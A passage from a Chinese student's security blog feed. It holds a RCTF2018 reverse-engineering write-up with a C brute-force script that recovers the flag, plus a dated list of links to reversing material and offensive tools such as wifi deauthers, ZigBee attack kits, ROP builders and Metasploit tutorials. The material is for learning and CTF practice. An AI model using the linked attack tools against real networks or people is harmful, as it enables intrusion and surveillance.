        &lt;h1 id=&quot;第七章-分析恶意Windows程序&quot;&gt;&lt;a href=&quot;#第七章-分析恶意Windows程序&quot; class=&quot;headerlink&quot; title=&quot;第七章 分析恶意Windows程序&quot;&gt;&lt;/a&gt;第七章 分析恶意Windows程序&lt;/h1&gt;&lt;h2 id=&quot;7x1-W
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2018 babyre WriteUp</title>
    <link href="https://kabeor.github.io/RCTF2018%20babyre%20WriteUp/"/>
    <id>https://kabeor.github.io/RCTF2018 babyre WriteUp/</id>
    <published>2018-05-23T02:17:44.286Z</published>
    <updated>2018-07-16T09:22:21.488Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RCTF2018-babyre-WriteUp"><a href="#RCTF2018-babyre-WriteUp" class="headerlink" title="RCTF2018 babyre WriteUp"></a>RCTF2018 babyre WriteUp</h1><p>题目给了一个压缩包，里面有两个文件<br><img src="https://i.loli.net/2018/07/16/5b4c610c56637.jpg" alt="mark"></p><p>out文件<br><img src="https://i.loli.net/2018/07/16/5b4c610c69bc1.jpg" alt="mark"></p><p>这种题型应该就是<strong>得到算法后枚举，与正确输出的out作比较</strong></p><p>那么首先拿IDA看一下吧</p><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>先搜索一下字符串吧<br><img src="https://i.loli.net/2018/07/16/5b4c610c7ddcd.jpg" alt="mark"><br>可以看到这些有用的提示，使用交叉引用到汇编指令</p><p>用图形化看一下(最后一张有一点歪了，请原谅)</p><blockquote><p>main函数 0x08048B49<br>比较长，挑重点</p></blockquote><p><img src="https://i.loli.net/2018/07/16/5b4c610c92917.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c610cacf3c.jpg" alt="mark"></p><blockquote><p>返回输出流程 0x804882B</p></blockquote><p> <img src="https://i.loli.net/2018/07/16/5b4c610cc14cd.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c610cd608a.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/16/5b4c610cee796.jpg" alt="mark"></p><p>注意到那个红色的报错了吗，是的，我们现在无法F5<br><img src="https://i.loli.net/2018/07/16/5b4c610d0dda9.jpg" alt="mark"></p><p>显示<strong>sp分析失败</strong><br>经过搜索学习，明白了这种问题一般都是堆栈不平衡导致的，因此我们需要手动调整栈指针</p><p>首先 菜单栏OPtions-&gt;General<br><img src="https://i.loli.net/2018/07/16/5b4c6129b8c3c.jpg" alt="mark"></p><p>打上勾<br>然后回到汇编窗口，找到loc_80848CBB</p><p><img src="https://i.loli.net/2018/07/16/5b4c6129d2384.jpg" alt="mark"></p><p>观察发现，lea和retn处的栈指针都是00，导致问题的出现，因此我们应该运用堆栈平衡原理，将其平衡</p><p>具体来说，想要修改一个位置的指针，需要将鼠标指向这个指针的上一个指针，然后 Alt+K</p><p><img src="https://i.loli.net/2018/07/16/5b4c6129e5917.jpg" alt="mark"></p><p>将里面的0x9C修改为0x0，确认<br><img src="https://i.loli.net/2018/07/16/5b4c612a05caa.jpg" alt="mark"></p><p>现在堆栈平衡，就可以F5了</p><p>当然了，还可以选择GDB动态调试，在出错这里下断点，然后步入看汇编，但因为对汇编看的还不是很熟悉，GDB也不常接触，于是只能F5了(流下没技术的泪水)</p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>F5看一下<br><img src="https://i.loli.net/2018/07/16/5b4c612a1b97a.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/16/5b4c612a2f2f2.jpg" alt="mark"></p><p>主函数判断输入格式，v4处可以看到，是将其<strong>八位即四字节一组(int大小为2字节，8/2=4)</strong>进行分组</p><p>然后sub_804882B内是回显<br><img src="https://i.loli.net/2018/07/16/5b4c612a42428.jpg" alt="mark"></p><p>sub_8048A41和sub_8048980不太清楚是干嘛的，应该是初始化和转换之类的</p><p><strong>算法位于sub_80488E0内</strong></p><p>先记住<strong>sub_80488E0(&amp;v6, 0xA72BE4C1, 0x1D082C23, seed, v4, v3);</strong>，后面有用</p><h3 id="内部"><a href="#内部" class="headerlink" title="内部"></a>内部</h3><p><img src="https://i.loli.net/2018/07/16/5b4c612a57264.jpg" alt="mark"></p><p>看到一个30次的循环，嵌套sub_804868B<br>进去看看</p><p><img src="https://i.loli.net/2018/07/16/5b4c612a6b196.jpg" alt="mark"></p><p>现在整个算法的全貌就展示在了我们面前</p><p>逐位循环0x20F次换算成四字节一组也就是0x20F/4=0x7F<br>于是我们只需要从0x20到0x7F进行枚举，按照相应算法对out进行比较即可,注意80488E0一开始传入的两个字符串需要互换然后合并</p><p>解题脚本如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">uint32_t foo(uint32_t a1, uint64_t a2) // sub_804868B</span><br><span class="line">&#123;</span><br><span class="line">    int j;</span><br><span class="line">    uint64_t v5;</span><br><span class="line">    uint32_t in;</span><br><span class="line">    in = a1;</span><br><span class="line">    for (j = 0; j &lt;= 527; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = a2 &gt;&gt; (j &amp; 0x1F);</span><br><span class="line">        if (j &amp; 0x20)</span><br><span class="line">            v5 = v5 &gt;&gt; 32;           //高低位转换 </span><br><span class="line">        in = (in &gt;&gt; 1) ^ ((v5 ^ in ^ (in &gt;&gt; 16) ^ (0x5C743A2E &gt;&gt; (((in &gt;&gt; 1) &amp; 1)</span><br><span class="line">            + 2</span><br><span class="line">            * (2</span><br><span class="line">                * (((in &gt;&gt; 20) &amp; 1)</span><br><span class="line">                    + 2* (2 * (in &gt;&gt; 31) + ((in &gt;&gt; 26) &amp; 1)))</span><br><span class="line">                + ((in &gt;&gt; 9) &amp; 1))))) &lt;&lt; 31);</span><br><span class="line">    &#125;</span><br><span class="line">    return in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t data[30] = // out</span><br><span class="line">    &#123;</span><br><span class="line">        0xB80C91FE,0x70573EFE,</span><br><span class="line">        0xBEED92AE,0x7F7A8193,</span><br><span class="line">        0x7390C17B,0x90347C6C,</span><br><span class="line">        0xAA7A15DF,0xAA7A15DF,</span><br><span class="line">        0x526BA076,0x153F1A32,</span><br><span class="line">        0x545C15AD,0x7D8AA463,</span><br><span class="line">        0x526BA076,0xFBCB7AA0,</span><br><span class="line">        0x7D8AA463,0x9C513266,</span><br><span class="line">        0x526BA076,0x6D7DF3E1,</span><br><span class="line">        0xAA7A15DF,0x9C513266,</span><br><span class="line">        0x1EDC3864,0x9323BC07,</span><br><span class="line">        0x7D8AA463,0xFBCB7AA0,</span><br><span class="line">        0x153F1A32,0x526BA076,</span><br><span class="line">        0xF5650025,0xAA7A15DF,</span><br><span class="line">        0x1EDC3864,0xB13AD888</span><br><span class="line">    &#125;;</span><br><span class="line">    int i;</span><br><span class="line">    uint32_t j;</span><br><span class="line">    for (i = 0; i &lt; 30; i++)</span><br><span class="line">        for (j = 0x20; j &lt; 0x7F; j++)                    //0x20F/4=0x7F </span><br><span class="line">            if (foo(j, 0x1D082C23A72BE4C1) == data[i])   //互换，合并 </span><br><span class="line">                printf(&quot;%c&quot;, j);</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p><img src="https://i.loli.net/2018/07/16/5b4c612a7fbca.jpg" alt="mark"></p><p>解出： RCTF{Kee1o9_1s_a1ready_so1ved}</p><p>From <a href="https://kabeor.github.io/RCTF2018 babyre WriteUp/">https://kabeor.github.io/RCTF2018 babyre WriteUp/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RCTF2018-babyre-WriteUp&quot;&gt;&lt;a href=&quot;#RCTF2018-babyre-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;RCTF2018 babyre WriteUp&quot;&gt;&lt;/a&gt;RCTF2018 babyre W
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>写在前面的话</title>
    <link href="https://kabeor.github.io/Top/"/>
    <id>https://kabeor.github.io/Top/</id>
    <published>2018-05-18T14:24:59.000Z</published>
    <updated>2018-08-03T01:24:03.707Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h1><p>一直想要写这个了，每天记录，每周上传吧，把每天有意思的事物写下来</p><h2 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h2><p>先解答一些包括我也很崩溃的问题</p><ol><li>博客为什么加载这么慢，163为什么加载资源失败<blockquote><p>首先我的博客是多图流，图片都是高清或是4K的，我尽量把图片都压缩到500k以下了，js也优化过，是真的尽力了啊。。<br>我侧边栏加了一个网易云音乐的js，如果提示资源加载失败的话，请把代理关了，或者如果不想听歌的话不用管它也行，直接确认好了。<br>然后因为是大一，买不起cdn诶，求大佬赞助(偷偷放链接 <a href="http://t.cn/R3YA9gO" target="_blank" rel="noopener">http://t.cn/R3YA9gO</a>)<br>然后其他理由想起来再补充</p></blockquote></li><li>待补充，欢迎提问</li></ol><hr><h2 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h2><h3 id="2018-8-3"><a href="#2018-8-3" class="headerlink" title="2018.8.3"></a>2018.8.3</h3><p><strong>CTF中常见的RSA相关问题总结</strong><br><a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">https://xz.aliyun.com/t/2446</a></p><p><strong>x86_64逆向工程简介</strong><br><a href="https://xz.aliyun.com/t/2487" target="_blank" rel="noopener">https://xz.aliyun.com/t/2487</a></p><p><strong>x86 汇编字符串指令总结</strong><br><a href="https://medium.com/@ophirharpaz/a-summary-of-x86-string-instructions-87566a28c20c" target="_blank" rel="noopener">https://medium.com/@ophirharpaz/a-summary-of-x86-string-instructions-87566a28c20c</a></p><p><strong>动态二进制插桩的原理和基本实现</strong><br><a href="http://deniable.org/reversing/binary-instrumentation" target="_blank" rel="noopener">http://deniable.org/reversing/binary-instrumentation</a></p><p><strong>seeker - 获取高精度地理信息和设备信息的工具</strong><br><a href="https://github.com/thewhiteh4t/seeker" target="_blank" rel="noopener">https://github.com/thewhiteh4t/seeker</a></p><p><strong>现代二进制漏洞利用课程，由Rensselaer Polytechnic Institute的 RPISEC团队开发制作</strong><br><a href="http://security.cs.rpi.edu/courses/binexp-spring2015/" target="_blank" rel="noopener">http://security.cs.rpi.edu/courses/binexp-spring2015/</a></p><p><strong>使用树莓派制作一个迷你的 wifi 攻击器</strong><br><a href="https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/" target="_blank" rel="noopener">https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/</a></p><h3 id="2018-7-19"><a href="#2018-7-19" class="headerlink" title="2018.7.19"></a>2018.7.19</h3><p>练车真的很烦。。。<br><strong>cutter: A Qt and C++ GUI for radare2 reverse engineering framework</strong><br><a href="https://github.com/radareorg/cutter" target="_blank" rel="noopener">https://github.com/radareorg/cutter</a></p><p><strong>PassphraseGen - 用于生成自定义密码短语列表的脚本，方便使用 hashcat 进行密码破解</strong><br><a href="https://github.com/dafthack/PassphraseGen" target="_blank" rel="noopener">https://github.com/dafthack/PassphraseGen</a></p><p><strong>ISSISP 18 符号执行与模糊测试</strong><br><a href="https://cs.anu.edu.au/cybersec/issisp2018/assets/slides/AbhikISSISPMon.pdf" target="_blank" rel="noopener">https://cs.anu.edu.au/cybersec/issisp2018/assets/slides/AbhikISSISPMon.pdf</a></p><p><strong>ISSISP 18 基于符号执行的自动程序修复</strong><br><a href="https://cs.anu.edu.au/cybersec/issisp2018/assets/slides/AbhikISSISPWed.pdf" target="_blank" rel="noopener">https://cs.anu.edu.au/cybersec/issisp2018/assets/slides/AbhikISSISPWed.pdf</a></p><p><strong>Pwn Adventure 3</strong><br><a href="http://pwnadventure.com/" target="_blank" rel="noopener">http://pwnadventure.com/</a></p><p><strong>通过 Pwn Adventure 3 游戏学习 FRIDA</strong><br><a href="https://x-c3ll.github.io/posts/Frida-Pwn-Adventure-3/" target="_blank" rel="noopener">https://x-c3ll.github.io/posts/Frida-Pwn-Adventure-3/</a></p><p><strong>针对 Raspberry Pi 的内核研究</strong><br><a href="http://blog.k3170makan.com/2018/07/reversing-bare-bones-raspberry-pi.html" target="_blank" rel="noopener">http://blog.k3170makan.com/2018/07/reversing-bare-bones-raspberry-pi.html</a></p><p><strong>如何使用 IDAPython 寻找漏洞</strong><br><a href="https://www.somersetrecon.com/blog/2018/7/6/introduction-to-idapython-for-vulnerability-hunting" target="_blank" rel="noopener">https://www.somersetrecon.com/blog/2018/7/6/introduction-to-idapython-for-vulnerability-hunting</a></p><p><strong>killerbee - 攻击 ZigBee 以及 IEEE 802.15.4 网络的工具集</strong><br><a href="https://github.com/riverloopsec/killerbee" target="_blank" rel="noopener">https://github.com/riverloopsec/killerbee</a></p><p><strong>ropgenerator - 帮助构造 ROP 链的工具</strong><br><a href="https://github.com/Boyan-MILANOV/ropgenerator" target="_blank" rel="noopener">https://github.com/Boyan-MILANOV/ropgenerator</a></p><p><strong>Bypass Data Execution Protection绕过方法介绍</strong><br><a href="https://movaxbx.ru/2018/07/16/bypass-data-execution-protection-dep/" target="_blank" rel="noopener">https://movaxbx.ru/2018/07/16/bypass-data-execution-protection-dep/</a></p><p><strong>METASPLOIT TUTORIALS</strong><br><a href="https://www.hackingtutorials.org/category/metasploit-tutorials/" target="_blank" rel="noopener">https://www.hackingtutorials.org/category/metasploit-tutorials/</a></p><p><strong>mcsema - 一款二进制转换工具，可将机器码转换为LLVM中间代码，并提供了 IDA 和binninja 的接口脚本</strong><br><a href="https://github.com/trailofbits/mcsema" target="_blank" rel="noopener">https://github.com/trailofbits/mcsema</a></p><p><strong>Review:Offensive Security Certified Professional (OSCP)</strong><br><a href="https://www.hackingtutorials.org/hacking-courses/offensive-security-certified-professional-oscp/" target="_blank" rel="noopener">https://www.hackingtutorials.org/hacking-courses/offensive-security-certified-professional-oscp/</a></p><p><strong>如何开始逆向学习与病毒分析</strong><br><a href="https://hshrzd.wordpress.com/how-to-start/" target="_blank" rel="noopener">https://hshrzd.wordpress.com/how-to-start/</a></p><p><strong>对 PE 文件签名的深入研究</strong><br><a href="http://research32.blogspot.com/2016/03/pe-file-signing.html" target="_blank" rel="noopener">http://research32.blogspot.com/2016/03/pe-file-signing.html</a></p><h3 id="2018-7-10"><a href="#2018-7-10" class="headerlink" title="2018.7.10"></a>2018.7.10</h3><p><strong>GBA 游戏机自定义固件的源码</strong><br><a href="https://github.com/ez-flash/omega-kernel" target="_blank" rel="noopener">https://github.com/ez-flash/omega-kernel</a></p><p><strong>warberry - 为树莓派设计的渗透测试工具包</strong><br><a href="https://github.com/secgroundzero/warberry" target="_blank" rel="noopener">https://github.com/secgroundzero/warberry</a></p><p><strong>使用 r2pipe 协助逆向分析</strong><br><a href="https://goggleheadedhacker.com/blog/post/8" target="_blank" rel="noopener">https://goggleheadedhacker.com/blog/post/8</a></p><p><strong>hawkeye - 从文件系统中搜索敏感文件的工具</strong><br><a href="https://github.com/Ice3man543/hawkeye" target="_blank" rel="noopener">https://github.com/Ice3man543/hawkeye</a></p><p><strong>trackerjacker-无线网络追踪工具</strong><br><a href="https://github.com/calebmadrigal/trackerjacker" target="_blank" rel="noopener">https://github.com/calebmadrigal/trackerjacker</a></p><p><strong>weixin:// 跳转研究</strong><br><a href="http://t.cn/Rdpmd8L" target="_blank" rel="noopener">http://t.cn/Rdpmd8L</a></p><p><strong>collection-document:优质安全文章收藏,长期更新</strong><br><a href="https://github.com/tom0li/collection-document" target="_blank" rel="noopener">https://github.com/tom0li/collection-document</a></p><p><strong>IDA Pro plugin to make functions tree view</strong><br><a href="https://github.com/ax330d/functions-plus" target="_blank" rel="noopener">https://github.com/ax330d/functions-plus</a></p><h3 id="2018-7-5"><a href="#2018-7-5" class="headerlink" title="2018.7.5"></a>2018.7.5</h3><p>今天参加了2018工业信息安全技能大赛，实际的分析了一次工业固件，感觉难度很大，之前也没有接触过工控安全，还是挺有趣的，参赛选手大多是掉光头发的中年man。。。</p><p><strong>The Return of Disassembly Desynchronization</strong><br><a href="https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/the_return_of_disassembly_desynchronization/the_return_of_disassembly_desynchronization.md" target="_blank" rel="noopener">https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/the_return_of_disassembly_desynchronization/the_return_of_disassembly_desynchronization.md</a></p><p><strong>Zeratool - 自动化生成漏洞利用并寻找 Flag 的 CTF 比赛工具</strong><br><a href="https://github.com/ChrisTheCoolHut/Zeratool" target="_blank" rel="noopener">https://github.com/ChrisTheCoolHut/Zeratool</a></p><p><strong>Detecting Reverse Engineering with Canaries</strong><br><a href="https://mulliner.org/collin/publications/Detecting_Reverse_Engineering_with_Canaries_CanSecWest2018.pdf" target="_blank" rel="noopener">https://mulliner.org/collin/publications/Detecting_Reverse_Engineering_with_Canaries_CanSecWest2018.pdf</a></p><p><strong>10 Cool Nmap Tricks and Techniques</strong><br><a href="https://blog.urfix.com/10-cool-nmap-tricks-techniques/" target="_blank" rel="noopener">https://blog.urfix.com/10-cool-nmap-tricks-techniques/</a></p><p><strong>基于 QEMU 的逆向分析沙箱 PyREBox</strong><br><a href="https://github.com/Cisco-Talos/pyrebox/tree/master/exploit_detect" target="_blank" rel="noopener">https://github.com/Cisco-Talos/pyrebox/tree/master/exploit_detect</a></p><p><strong>针对 ELF 文件格式的解析与利用</strong><br><a href="https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267" target="_blank" rel="noopener">https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267</a></p><p><strong>使用 IDA Python 进行相似漏洞搜索</strong><br><a href="https://www.zerodayinitiative.com/blog/2018/6/26/mindshare-variant-hunting-with-ida-python" target="_blank" rel="noopener">https://www.zerodayinitiative.com/blog/2018/6/26/mindshare-variant-hunting-with-ida-python</a></p><p><strong>The 101 of ELF files on Linux</strong><br><a href="https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/" target="_blank" rel="noopener">https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/</a></p><p><strong>初学者的逆向工程学习网站</strong><br><a href="https://begin.re" target="_blank" rel="noopener">https://begin.re</a></p><p><strong>rogue - 无线网络攻击工具包</strong><br><a href="https://github.com/InfamousSYN/rogue" target="_blank" rel="noopener">https://github.com/InfamousSYN/rogue</a></p><p><strong>反调试及绕过</strong><br><a href="http://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E8%B0%83%E8%AF%95%E5%8F%8A%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">http://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E8%B0%83%E8%AF%95%E5%8F%8A%E7%BB%95%E8%BF%87/</a></p><p><strong>基于CTF挑战写就的二进制分析课程</strong>(很棒！)<br><a href="https://maxkersten.nl/binary-analysis-course/" target="_blank" rel="noopener">https://maxkersten.nl/binary-analysis-course/</a></p><p><strong>Intro to x86 Assembly Language</strong><br>视频:  <a href="https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe" target="_blank" rel="noopener">https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe</a><br>代码:  <a href="https://github.com/code-tutorials/assembly-intro" target="_blank" rel="noopener">https://github.com/code-tutorials/assembly-intro</a></p><p><strong>awesome-ninja-admins</strong><br><a href="https://github.com/trimstray/awesome-ninja-admins" target="_blank" rel="noopener">https://github.com/trimstray/awesome-ninja-admins</a></p><p><strong>信息安全知识库 2018全站离线打包</strong><br><a href="https://pan.baidu.com/s/1gf4Brb1#list/path=%2F" target="_blank" rel="noopener">https://pan.baidu.com/s/1gf4Brb1#list/path=%2F</a></p><p><strong>Docker概念详细的介绍</strong><br><a href="https://mp.weixin.qq.com/s?__biz=MzU4NDQ4MzU5OA==&amp;mid=2247484127&amp;idx=1&amp;sn=70ee95619ec761da884c4f9af3e83194&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU4NDQ4MzU5OA==&amp;mid=2247484127&amp;idx=1&amp;sn=70ee95619ec761da884c4f9af3e83194&amp;scene=21#wechat_redirect</a></p><p><strong>ip2region:ip地址定位库，0.0x毫秒级查询，数据库文件大小只有1.5M</strong><br><a href="http://t.cn/Rt9u3Ef" target="_blank" rel="noopener">http://t.cn/Rt9u3Ef</a></p><h3 id="2018-6-23"><a href="#2018-6-23" class="headerlink" title="2018.6.23"></a>2018.6.23</h3><p><strong>针对恶意软件逆向工程的新手引导大挑战</strong><br><a href="https://www.malwaretech.com/beginner-malware-reversing-challenges" target="_blank" rel="noopener">https://www.malwaretech.com/beginner-malware-reversing-challenges</a></p><p><strong>Hook原理</strong><br><a href="https://bbs.pediy.com/thread-228669.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-228669.htm</a></p><p><strong>用Python任意下载爱奇艺VIP视频</strong><br><a href="https://www.77169.com/html/211389.html" target="_blank" rel="noopener">https://www.77169.com/html/211389.html</a></p><h3 id="2018-6-20"><a href="#2018-6-20" class="headerlink" title="2018.6.20"></a>2018.6.20</h3><p>放假快乐！</p><p><strong>使用Radare2和Cutter解密APT33的Dropshot恶意软件</strong><br><a href="https://www.megabeets.net/decrypting-dropshot-with-radare2-and-cutter-part-1/" target="_blank" rel="noopener">https://www.megabeets.net/decrypting-dropshot-with-radare2-and-cutter-part-1/</a></p><p><strong>A journey into Radare2</strong><br><a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/" target="_blank" rel="noopener">https://github.com/ITAYC0HEN/A-journey-into-Radare2/</a></p><p><strong>逆向工程的发展过程回顾与展望，来自 SSTIC 2018 Halvar Flake</strong><br><a href="https://docs.google.com/presentation/d/1ljVUiXVi2PfEdolGXr7Wpepj0x2RxaOo9rzMKWXebG4/mobilepresent?slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1ljVUiXVi2PfEdolGXr7Wpepj0x2RxaOo9rzMKWXebG4/mobilepresent?slide=id.p</a></p><p><strong>x86 assembly doesn’t have to be scary (interactive)</strong><br><a href="https://blog.benjojo.co.uk/post/interactive-x86-bootloader-tutorial" target="_blank" rel="noopener">https://blog.benjojo.co.uk/post/interactive-x86-bootloader-tutorial</a></p><p><strong>Penetration-Testing - 渗透测试方向优秀资源收集</strong><br><a href="https://github.com/Kinimiwar/Penetration-Testing" target="_blank" rel="noopener">https://github.com/Kinimiwar/Penetration-Testing</a></p><p><strong>Reverse-engineered Diablo source code </strong><br><a href="https://github.com/galaxyhaxz/devilution" target="_blank" rel="noopener">https://github.com/galaxyhaxz/devilution</a></p><h3 id="2018-6-15"><a href="#2018-6-15" class="headerlink" title="2018.6.15"></a>2018.6.15</h3><p><strong>使用 ptrace 进行反调试并实现对 ptrace 的隐藏调用</strong><br><a href="https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/hiding_call_to_ptrace/hiding_call_to_ptrace.md" target="_blank" rel="noopener">https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/hiding_call_to_ptrace/hiding_call_to_ptrace.md</a></p><p><strong>如何在网络安全领域获得职业的成功：信息安全入门，学习，练习和成长指南(Daniel Miessler)</strong><br><a href="https://danielmiessler.com/blog/build-successful-infosec-career/" target="_blank" rel="noopener">https://danielmiessler.com/blog/build-successful-infosec-career/</a></p><p><strong>手查PE导出表</strong><br><a href="https://bbs.pediy.com/thread-205989.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-205989.htm</a></p><p><strong>手查PE重定向</strong><br><a href="https://bbs.pediy.com/thread-206072.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-206072.htm</a></p><h3 id="2018-6-14"><a href="#2018-6-14" class="headerlink" title="2018.6.14"></a>2018.6.14</h3><p><strong>深入解析虚拟化</strong><br><a href="https://saferwall.com/blog" target="_blank" rel="noopener">https://saferwall.com/blog</a></p><h3 id="2018-6-13"><a href="#2018-6-13" class="headerlink" title="2018.6.13"></a>2018.6.13</h3><p><strong>栈溢出攻击原理实例详解</strong><br><a href="http://www.purpleroc.com/html/961247.html" target="_blank" rel="noopener">http://www.purpleroc.com/html/961247.html</a></p><h3 id="2018-6-12"><a href="#2018-6-12" class="headerlink" title="2018.6.12"></a>2018.6.12</h3><p><strong>逆向基于 Unity 引擎的 Android 游戏 Temple Run（神庙逃亡）</strong><br><a href="https://www.rotlogix.com/blog/2018/6/10/reverse-engineering-android-unity-games-part-one" target="_blank" rel="noopener">https://www.rotlogix.com/blog/2018/6/10/reverse-engineering-android-unity-games-part-one</a></p><h3 id="2018-6-11"><a href="#2018-6-11" class="headerlink" title="2018.6.11"></a>2018.6.11</h3><p><strong>C语言实现虚拟机</strong><br><a href="https://felixangell.com/blog/virtual-machine-in-c" target="_blank" rel="noopener">https://felixangell.com/blog/virtual-machine-in-c</a></p><p><strong>C语言实现哈希表</strong><br><a href="https://github.com/jamesroutley/write-a-hash-table" target="_blank" rel="noopener">https://github.com/jamesroutley/write-a-hash-table</a></p><h3 id="2018-6-10"><a href="#2018-6-10" class="headerlink" title="2018.6.10"></a>2018.6.10</h3><p><strong>FC机之超级玛丽简单逆向分析</strong><br><a href="https://bbs.pediy.com/thread-175564.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-175564.htm</a></p><h3 id="2018-6-9"><a href="#2018-6-9" class="headerlink" title="2018.6.9"></a>2018.6.9</h3><p><strong>全球气候可视化</strong><br><a href="https://earth.nullschool.net/" target="_blank" rel="noopener">https://earth.nullschool.net/</a></p><p><strong>图片文字清除插件</strong><br><a href="https://projectnaptha.com/" target="_blank" rel="noopener">https://projectnaptha.com/</a></p><p><strong>一个神奇的手绘公式网站</strong><br><a href="http://webdemo.myscript.com/" target="_blank" rel="noopener">http://webdemo.myscript.com/</a></p><p><strong>电影台词检索网站(英文)</strong><br><a href="http://www.subzin.com/" target="_blank" rel="noopener">http://www.subzin.com/</a></p><h3 id="2018-6-8"><a href="#2018-6-8" class="headerlink" title="2018.6.8"></a>2018.6.8</h3><p><strong>一本面向极客，致力于提高 Mac 工作效率的实用手册 </strong><br><a href="https://bestswifter.gitbook.io/effectivemac/" target="_blank" rel="noopener">https://bestswifter.gitbook.io/effectivemac/</a></p><p><strong>raspberry-pi-os - 使用 Linux 内核和 Raspberry Pi 进行操作系统开发的学习指南</strong><br><a href="https://github.com/s-matyukevich/raspberry-pi-os" target="_blank" rel="noopener">https://github.com/s-matyukevich/raspberry-pi-os</a></p><p><strong>虚拟机保护逆向入门</strong><br><a href="http://t.cn/RB7VCDU" target="_blank" rel="noopener">http://t.cn/RB7VCDU</a></p><h3 id="2018-6-6"><a href="#2018-6-6" class="headerlink" title="2018.6.6"></a>2018.6.6</h3><p>最近忙于复习</p><p><strong>符号执行引擎KLEE</strong><br><a href="http://klee.github.io/" target="_blank" rel="noopener">http://klee.github.io/</a></p><p><a href="https://srg.doc.ic.ac.uk/klee18/schedule.html" target="_blank" rel="noopener">https://srg.doc.ic.ac.uk/klee18/schedule.html</a></p><h3 id="2018-6-2"><a href="#2018-6-2" class="headerlink" title="2018.6.2"></a>2018.6.2</h3><p>复习了几天，今天考完几门，下下星期还得考高数，惆怅</p><p><strong>漫画风讲解DNS over HTTPS</strong><br><a href="https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/" target="_blank" rel="noopener">https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/</a></p><hr><h3 id="2018-5-25-27"><a href="#2018-5-25-27" class="headerlink" 